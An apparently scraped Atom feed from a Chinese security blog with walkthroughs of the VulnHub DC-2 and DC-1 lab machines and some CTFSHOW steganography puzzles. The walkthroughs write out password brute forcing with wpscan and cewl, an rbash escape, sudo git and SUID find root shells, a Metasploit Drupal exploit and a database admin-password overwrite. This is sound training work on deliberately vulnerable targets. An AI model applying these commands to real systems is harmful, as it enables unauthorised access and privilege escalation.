<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MS02423</title>
  
  <subtitle>MS02423</subtitle>
  <link href="http://ms02423.top/atom.xml" rel="self"/>
  
  <link href="http://ms02423.top/"/>
  <updated>2023-10-13T15:02:13.219Z</updated>
  <id>http://ms02423.top/</id>
  
  <author>
    <name>MS02423</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulnhub靶场之DC-2</title>
    <link href="http://ms02423.top/2023/10/13/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-2/"/>
    <id>http://ms02423.top/2023/10/13/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-2/</id>
    <published>2023-10-13T13:22:57.000Z</published>
    <updated>2023-10-13T15:02:13.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一．环境搭建"><a href="#一．环境搭建" class="headerlink" title="一．环境搭建"></a>一．环境搭建</h1><h2 id="1-靶机描述"><a href="#1-靶机描述" class="headerlink" title="1.靶机描述"></a>1.靶机描述</h2><p>与DC-1非常相似，DC-2是另一个专门建造的易受攻击的实验室，目的是在渗透测试领域获得经验。</p><p>与最初的DC-1一样，它的设计考虑到了初学者。</p><p>Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。</p><p>就像DC-1一样，有五个标志，包括最后一个标志。</p><h2 id="2-下载地址"><a href="#2-下载地址" class="headerlink" title="2.下载地址"></a>2.下载地址</h2><p> <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214402559.png" alt="image-20231013214402559"></p><h2 id="3-启动环境"><a href="#3-启动环境" class="headerlink" title="3.启动环境"></a>3.启动环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214451769.png" alt="image-20231013214451769"></p><h2 id="4-设置网卡为nat模式"><a href="#4-设置网卡为nat模式" class="headerlink" title="4.设置网卡为nat模式"></a>4.设置网卡为nat模式</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214559611.png" alt="image-20231013214559611"></p><p>虚拟机开启之后界面如下(和1一样)，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214714255.png" alt="image-20231013214714255"></p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>寻找真实的靶场ip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214909426.png" alt="image-20231013214909426"></p><p>Kali ip为192.168.52.152</p><p>所以分析可得靶机ip为192.168.52.131</p><h2 id="2-探端口以及服务"><a href="#2-探端口以及服务" class="headerlink" title="2.探端口以及服务"></a>2.探端口以及服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215059360.png" alt="image-20231013215059360"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215130572.png" alt="image-20231013215130572"></p><p>发现开放了80端口，存在web服务，Apache&#x2F;2.4.10，</p><p>发现开放了7744端口，开放了ssh服务，OpenSSH 6.7p1</p><h2 id="3-进行访问端口"><a href="#3-进行访问端口" class="headerlink" title="3.进行访问端口"></a>3.进行访问端口</h2><p>我们访问:<a href="http://192.168.52.131/">http://192.168.52.131</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215316817.png" alt="image-20231013215316817"></p><p>本地访问不了会自动跳到DC-2。应该是给重定向了！我们想到dc-2这个域名解析失败，我们需要更改hosts文件，添加一个ip域名指向。</p><p>修改hosts文件，添加靶机IP到域名dc-2的指向</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215523485.png" alt="image-20231013215523485"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215452669.png" alt="image-20231013215452669"></p><p>添加完成之后，再次访问，访问成功(我们使用kali里面的浏览器)</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215834927.png" alt="image-20231013215834927"></p><p>根据wappalyzer插件可知当前运行的是一个wordpress的站点</p><h1 id="三-查找所有flag"><a href="#三-查找所有flag" class="headerlink" title="三.查找所有flag"></a>三.查找所有flag</h1><h2 id="1-站点下面存在一个flag"><a href="#1-站点下面存在一个flag" class="headerlink" title="1.站点下面存在一个flag"></a>1.站点下面存在一个flag</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215918528.png" alt="image-20231013215918528"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220044963.png" alt="image-20231013220044963"></p><p>大致意思就是暴力破解，账号密码</p><h2 id="2-我们进行目录扫描"><a href="#2-我们进行目录扫描" class="headerlink" title="2.我们进行目录扫描"></a>2.我们进行目录扫描</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220314587.png" alt="image-20231013220314587"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220408917.png" alt="image-20231013220408917"></p><p>发现一个后台地址: <a href="http://dc-2/wp-login.php?redirect_to=http://dc-2/wp-admin/&reauth=1">http://dc-2/wp-login.php?redirect_to=http%3A%2F%2Fdc-2%2Fwp-admin%2F&amp;reauth=1</a></p><h2 id="3-我们进行用户枚举"><a href="#3-我们进行用户枚举" class="headerlink" title="3.我们进行用户枚举"></a>3.我们进行用户枚举</h2><p>1)前面我们提到这是一个wordpress的站，我们采用专门针对wordpress的工具wpscan来进行扫描</p><p>Wpscan一些常用语句：</p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a></p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a> –enumerate t 扫描主题</p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a> –enumerate p 扫描插件</p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a> –enumerate u 枚举用户</p><p>2)我们先进行用户爆破用户名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220646280.png" alt="image-20231013220646280"></p><p>可以看到爆破出来三个用户名</p><p>2)我们进行爆破密码</p><p>我们使用cewl生成字典，使用wpscan进行暴力破解</p><p>cewl <a href="http://dc-2/">http://dc-2/</a> &gt; MS02423.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220835248.png" alt="image-20231013220835248"></p><p>3)最后我们爆破出来2个账号</p><p>jerry&#x2F;adipiscing           tom&#x2F;parturient</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220912291.png" alt="image-20231013220912291"></p><p>4)我们进行登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221021765.png" alt="image-20231013221021765"></p><p>5)我们找到了flag2</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221421875.png" alt="image-20231013221421875"></p><p>6)我们查看flag2</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221437901.png" alt="image-20231013221437901"></p><p>意思是如果你不能利用WordPress并走捷径，还有另一种方法。</p><p>希望你找到了另一个切入点（这里我们想到7744端口，服务是ssh我们使用ssh进行登录）</p><h2 id="4-使用ssh进行登录"><a href="#4-使用ssh进行登录" class="headerlink" title="4.使用ssh进行登录"></a>4.使用ssh进行登录</h2><p>1)我们使用ssh登录账号，用jerry登录半天登录不上去，我们使用tom进行登录，发现可以登录成功，而且看到了flag3.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221825054.png" alt="image-20231013221825054"></p><p>2)我们查看flag3.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221945751.png" alt="image-20231013221945751"></p><p>我们发现使用cat看不了，被rbash限制了</p><p>3)使用compgen -c 查看可以使用的命令，我们使用vi进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222101048.png" alt="image-20231013222101048"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222123923.png" alt="image-20231013222123923"></p><h2 id="5-rbash绕过"><a href="#5-rbash绕过" class="headerlink" title="5.rbash绕过"></a>5.rbash绕过</h2><p>1)echo $PATH       显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222446343.png" alt="image-20231013222446343"></p><p>2)cd进不去目录 ,前面我们知道可以使用ls，使用ls直接查看目录信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222612721.png" alt="image-20231013222612721"></p><p>3)使用echo来绕过rbash</p><p>BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</p><p>export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</p><p>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</p><p>echo &#x2F;*</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222753663.png" alt="image-20231013222753663"></p><p>4)我们可以看到cd可以使用了，我们cd .. ls 可以看到jerry</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013223443700.png" alt="image-20231013223443700"></p><p>5)我们看到flag4.txt，查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013223524657.png" alt="image-20231013223524657"></p><p>意思是</p><p>很高兴看到你走了这么远，但你还没回家。</p><p>您仍然需要获得最后的标志(唯一真正重要的标志！)</p><p>这里没有暗示，一，你现在只能靠自己了。*-)</p><p>继续</p><p>大致意思就是还没有结束。猜想需要提权才能获取到最终的flag，并且flag4 提示我们可以使用git，我们可以通过git来提权</p><h2 id="6-我们进行提权"><a href="#6-我们进行提权" class="headerlink" title="6.我们进行提权"></a>6.我们进行提权</h2><p>1)我们可以看到无需root权限，jerry 可以使用 git</p><p>sudo -l </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013223939930.png" alt="image-20231013223939930"></p><p>2)查看一下可以使用的root权限命令</p><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224022322.png" alt="image-20231013224022322"></p><p>3)提权成功</p><p>1、sudo git help config #在末行命令模式输入 </p><p>!&#x2F;bin&#x2F;bash 或 !’sh’ #完成提权 </p><p>2、sudo git -p help </p><p>!&#x2F;bin&#x2F;bash #输入!&#x2F;bin&#x2F;bash，即可打开一个用户为root的shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224439557.png" alt="image-20231013224439557"></p><p>4)我们进入root用户</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224548835.png" alt="image-20231013224548835"></p><p>5)我们进行ls</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224558830.png" alt="image-20231013224558830"></p><p>6)我们查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224621819.png" alt="image-20231013224621819"></p><h1 id="四-相关知识点"><a href="#四-相关知识点" class="headerlink" title="四. 相关知识点"></a>四. 相关知识点</h1><p>1、git提权</p><p>2、rbash绕过</p><p>3、[ 常用工具篇 ] kali 自带目录扫描神器 dirb Headless (命令行)模式详解</p><p>4、WPScan使用完整攻略</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一．环境搭建&quot;&gt;&lt;a href=&quot;#一．环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一．环境搭建&quot;&gt;&lt;/a&gt;一．环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶机描述&quot;&gt;&lt;a href=&quot;#1-靶机描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC:1</title>
    <link href="http://ms02423.top/2023/09/25/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-1/"/>
    <id>http://ms02423.top/2023/09/25/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-1/</id>
    <published>2023-09-25T04:02:23.000Z</published>
    <updated>2023-09-25T13:10:11.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶机描述"><a href="#1-靶机描述" class="headerlink" title="1.靶机描述"></a>1.靶机描述</h2><p>DC-1是一个专门建造的易受攻击的实验室，目的是在渗透测试领域获得经验。它旨在对初学者来说是一个挑战，但它的难易程度取决于您的技能和知识以及您的学习能力。</p><h2 id="2-靶机下载地址"><a href="#2-靶机下载地址" class="headerlink" title="2.靶机下载地址"></a>2.靶机下载地址</h2><p> <a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925130702413.png" alt="image-20230925130702413"></p><h2 id="3-启动环境"><a href="#3-启动环境" class="headerlink" title="3.启动环境"></a>3.启动环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925130735248.png" alt="image-20230925130735248"></p><h2 id="4-设置网卡"><a href="#4-设置网卡" class="headerlink" title="4.设置网卡"></a>4.设置网卡</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925130817899.png" alt="image-20230925130817899"></p><h2 id="5-查看网段"><a href="#5-查看网段" class="headerlink" title="5.查看网段"></a>5.查看网段</h2><p>虚拟机开启之后需要登录，我们不知道密码，需要探活ip地址，</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">网段知道<span class="token punctuation">:</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925130850460.png" alt="image-20230925130850460"></p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>寻找真实的靶场ip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925132643084.png" alt="image-20230925132643084"></p><p>Kali ip为192.168.52.152</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">所以分析可得靶机ip为<span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.132</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探端口以及服务"><a href="#2-探端口以及服务" class="headerlink" title="2.探端口以及服务"></a>2.探端口以及服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925132911188.png" alt="image-20230925132911188"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">22</span>端口，开放了ssh服务，OpenSSH <span class="token number">6</span><span class="token punctuation">.</span>0p1发现开放了<span class="token number">80</span>端口，存在web服务，Apache httpd <span class="token number">2.2</span><span class="token number">.22</span>，Drupal 发现开放了<span class="token number">111</span>端口，开放了rpcbind服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-访问web站点"><a href="#3-访问web站点" class="headerlink" title="3.访问web站点"></a>3.访问web站点</h2><p><a href="http://192.168.52.132/">http://192.168.52.132/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925133053418.png" alt="image-20230925133053418"></p><p>发现是一个电信的drupal服务，根据wappalyzer插件可知当前运行的是Drupal 7的CMS</p><h2 id="4-使用MSF渗透"><a href="#4-使用MSF渗透" class="headerlink" title="4.使用MSF渗透"></a>4.使用MSF渗透</h2><p>1)搜索drupal7的漏洞</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925133447471.png" alt="image-20230925133447471">2)搜索drupal模块</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925133657843.png" alt="image-20230925133657843"></p><p>3)我们使用2018的模块</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925133840235.png" alt="image-20230925133840235"></p><p>默认端口就是80，所以这里我们不需要修改端口号</p><p>4)我们设置远程端口是靶机的ip地址——192.168.52.132,进行攻击可以看到攻击成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925134159921.png" alt="image-20230925134159921"></p><p>5)我们进入shell，查看权限和id</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925134325178.png" alt="image-20230925134325178"></p><p>6)我们查看所有文件，可以看到flag1.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925134520923.png" alt="image-20230925134520923"></p><h1 id="三-查找所有的flag"><a href="#三-查找所有的flag" class="headerlink" title="三.查找所有的flag"></a>三.查找所有的flag</h1><p>1)使用交互式拿shell</p><p>shell</p><p>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’   &#x2F;&#x2F;如果发现对方机器上有 python 的话</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925134913297.png" alt="image-20230925134913297"></p><p>2)我们查看flag1.txt，打开发现提示信息，内容提示寻找站点的配置文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925134953343.png" alt="image-20230925134953343"></p><p>3).我们网上搜索Drupal的默认配置文件为&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925135112925.png" alt="image-20230925135112925"></p><p>4)我们查看这个文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925135353283.png" alt="image-20230925135353283"></p><p>5)flag2提示，暴力和字典攻击不是常见的</p><p>只有获得访问权限的方式（以及您将需要访问）。</p><p>你可以用这些凭证做什么？</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925135426631.png" alt="image-20230925135426631"></p><p>6 )登录此数据库,查看数据库信息，账号和密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925135639933.png" alt="image-20230925135639933"></p><p>我们进入数据库</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925192821102.png" alt="image-20230925192821102"></p><p>查看数据库，切换到drupaldb数据库，查看查找默认的Drupal user 表，发现admin信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925192847241.png" alt="image-20230925192847241"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925193023539.png" alt="image-20230925193023539"></p><p>7)我们更改drupal密码</p><p>忘记密码的解决方法</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925193106680.png" alt="image-20230925193106680"></p><p>我们使用第二种方法</p><p>站点路径下执行</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925193537986.png" alt="image-20230925193537986"></p><p>然后在进入数据库中把密码字段进行替换</p><p>进入mysql，输入密码，切换到drupaldb数据库</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925193733321.png" alt="image-20230925193733321"></p><p>将pass字段进行替换</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">update users <span class="token keyword">set</span> pass<span class="token operator">=</span><span class="token string">"xxxx"</span> where name<span class="token operator">=</span><span class="token string">"admin"</span>;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925194218832.png" alt="image-20230925194218832"></p><p>8)我们访问站点</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925194400286.png" alt="image-20230925194400286"></p><p>9)发现flag3</p><p>登陆站点之后，随便翻一番，发现flag3</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925194516104.png" alt="image-20230925194516104"></p><p>10)点击flag3进入，发现提示信息</p><p>大致意思是提权并提示 -exec，想到suid提权 find 命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925194557997.png" alt="image-20230925194557997"></p><p>11)使用命令查看 suid 权限的可执行二进制程序</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">find <span class="token operator">/</span> -perm <span class="token number">-4000</span> <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是一个在Linux或类似系统中使用的命令。它的意思是在根目录（&#x2F;）下查找所有具有setuid位设置的文件。2&gt;&#x2F;dev&#x2F;null表示将错误消息重定向到&#x2F;dev&#x2F;null，即忽略错误消息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925194747795.png" alt="image-20230925194747795"></p><p>12)我们使用find进行提权</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">find <span class="token operator">/</span>-name ms02423<span class="token punctuation">.</span><span class="token keyword">top</span> -exec <span class="token string">'whoami'</span> \;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925195014660.png" alt="image-20230925195014660"></p><p>13)我们切换语句进入shell，执行whoami查看当前权限，执行ls查看当前目录下文件，切换到root目录，查看文件，发现cat thefinalflag.txt文件。</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">find <span class="token operator">/</span> -name ms02423<span class="token punctuation">.</span><span class="token keyword">top</span> -exec <span class="token string">"/bin/sh"</span> \;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925195319287.png" alt="image-20230925195319287"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925195441308.png" alt="image-20230925195441308"></p><p>大致就是说你已经通过了本关卡。</p><p>14)find提权方法</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230925203847635.png" alt="image-20230925203847635"></p><p>15)这个靶机的flag完全取得</p><h1 id="四-相关知识点"><a href="#四-相关知识点" class="headerlink" title="四.相关知识点"></a>四.相关知识点</h1><p>1.[ MSF使用实例 ] 利用永恒之黑采用正向连接 shell 获得主机权限(CVE-2020-0796)(SMBGhost)</p><p>2.简谈SUID提权(find提权方法)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶机描述&quot;&gt;&lt;a href=&quot;#1-靶机描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>图片隐写</title>
    <link href="http://ms02423.top/2023/08/08/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <id>http://ms02423.top/2023/08/08/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</id>
    <published>2023-08-08T03:16:06.000Z</published>
    <updated>2023-08-08T12:11:10.312Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFSHOW——MISC"><a href="#CTFSHOW——MISC" class="headerlink" title="CTFSHOW——MISC"></a>CTFSHOW——MISC</h1><h2 id="1-杂项签到"><a href="#1-杂项签到" class="headerlink" title="1.杂项签到"></a>1.杂项签到</h2><p>1)我们下载附件，一般签到题目，都是比较简单的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808112637576.png" alt="image-20230808112637576"></p><p>2)我们打开附件，发现需要密码(猜测可能是伪加密)，我们放到010进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808112938004.png" alt="image-20230808112938004"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808113203334.png" alt="image-20230808113203334"></p><p>3)查看flag.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808113230123.png" alt="image-20230808113230123"></p><p>知识点:</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">zip伪加密就是通过修改zip压缩包特定的字节，进而在打开文件时压缩包被识别为使用了密码加密，从而达到伪装加密效果。一个ZIP文件由三大部分组成：压缩源文件数据区<span class="token operator">+</span>压缩源文件目录区<span class="token operator">+</span>压缩源文件目录结束标志<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">识别一个zip文件是否加密主要是看压缩源文件数据的全局方式位标记和压缩源文件目录区的全局方式位标记，关键操作在其中的全局方式标记的第一字节数字的奇偶上，其它的不管为何值，都不影响它的加密属性。通常全局方式位标记为<span class="token number">2</span> bytes长度，第一字节数字为偶数表示无加密，例如：<span class="token number">00,02</span><span class="token number">,04</span>等；为奇数表示有加密，例如<span class="token number">01,03</span><span class="token number">,09</span>等。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1.无加密<br>无加密的zip压缩包压缩源文件数据区的全局加密应当为00 00，且压缩源文件目录区的全局方式位标记也为 00 00。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808113701580.png" alt="image-20230808113701580"></p><p>2.真加密<br>真加密的zip压缩包压缩源文件数据区的全局加密应当为01 00，且压缩源文件目录区的全局方式位标记应当为 01 00。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808113646038.png" alt="image-20230808113646038"></p><p>3.伪加密<br>伪加密的zip压缩包压缩源文件数据区的全局加密为 00 00，且压缩源文件目录区的全局方式位标记为09 00或者01 00。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808113711535.png" alt="image-20230808113711535"></p><h2 id="2-misc2"><a href="#2-misc2" class="headerlink" title="2.misc2"></a>2.misc2</h2><p>1)我们下载附件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808114115016.png" alt="image-20230808114115016"></p><p>2)虚拟机添加软盘file即可<br> 如何添加软盘呢？<br> 先创建一个虚拟机，一切默认就好。<br> 编辑虚拟机设置，一般的没有软盘选项，需要手动添加。下面有一个添加按钮，加上软盘就可以啦！</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808114623586.png" alt="image-20230808114623586"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808114632401.png" alt="image-20230808114632401"></p><h2 id="3-miscx"><a href="#3-miscx" class="headerlink" title="3.miscx"></a>3.miscx</h2><p>1).我们下载附件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115214629.png" alt="image-20230808115214629"></p><p>2)我们进行提取文件，发现需要密码，但是最后一个没有加密，我们打开之后是一串音乐字符我们进行解密。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115312556.png" alt="image-20230808115312556"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115322643.png" alt="image-20230808115322643"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115333156.png" alt="image-20230808115333156"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115349537.png" alt="image-20230808115349537"></p><p>3)我们可以看到解密之后是隐藏rabbit编码，我们进行解密密码是2020</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Rabbit使用一个<span class="token number">128</span>位和一个<span class="token number">64</span>位初始化向量。该加密算法的核心组件是一个位流生成器，该生成器每次迭代都会加密<span class="token number">128</span>个消息位。加密后的数据以U2FsdGVkX1开头，可以设定密钥。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115404196.png" alt="image-20230808115404196"></p><p>4)解密之后是welcome_to_payhelp，是hint.txt的密码，我们可以看到一串base64编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808115437737.png" alt="image-20230808115437737"></p><p>解密6次之后，发现是url编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151319402.png" alt="image-20230808151319402"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151444276.png" alt="image-20230808151444276"></p><p>5)提取flag.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151600074.png" alt="image-20230808151600074"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151625694.png" alt="image-20230808151625694"></p><h2 id="4-misc30"><a href="#4-misc30" class="headerlink" title="4.misc30"></a>4.misc30</h2><p>1)我们下载附件,放到010进行分析</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151820670.png" alt="image-20230808151820670"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808151923947.png" alt="image-20230808151923947"></p><p>2)可以看到是一个压缩包文件，我们重命名为1.rar，打开之后可以看到3个文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152005032.png" alt="image-20230808152005032"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152056314.png" alt="image-20230808152056314"></p><p>3)除了星空.jpg不需要密码外，其他两个都需要，我们从星空.jpg下手</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152244213.png" alt="image-20230808152244213"></p><p>属性里面看到little stars，猜测是密码，果不其然的doc的密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152341427.png" alt="image-20230808152341427"></p><p>4)可以看到没有如何有用信息，但是可以看到好多的箭头，我们把页面颜色弄成黑色即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152623025.png" alt="image-20230808152623025"></p><p>5)猜测是flag.png的密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808152901333.png" alt="image-20230808152901333"></p><p>提取之后是一个二维码，我们使用工具即可</p><p><img 